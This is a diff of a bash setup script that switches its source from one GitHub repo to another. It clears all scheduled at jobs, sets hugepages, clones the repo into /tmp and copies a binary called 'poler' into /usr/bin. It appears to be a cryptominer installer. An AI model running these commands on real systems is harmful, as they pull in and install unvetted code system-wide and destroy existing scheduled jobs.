@@ -1,18 +1,18 @@
 #!/bin/bash
 
-rm -rf /tmp/one/
+rm -rf /tmp/four/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir one
-git clone https://github.com/today100not/one.git /tmp/one
-cd /tmp/one
-chmod +x /tmp/one/poler
+cd /tmp && mkdir four
+git clone https://github.com/today100not/four.git /tmp/four
+cd /tmp/four
+chmod +x /tmp/four/poler
 chmod 777 ./*.sh
-cp /tmp/one/poler /usr/bin/
+cp /tmp/four/poler /usr/bin/
 sleep 3
 
 sudo apt-get install dos2unix
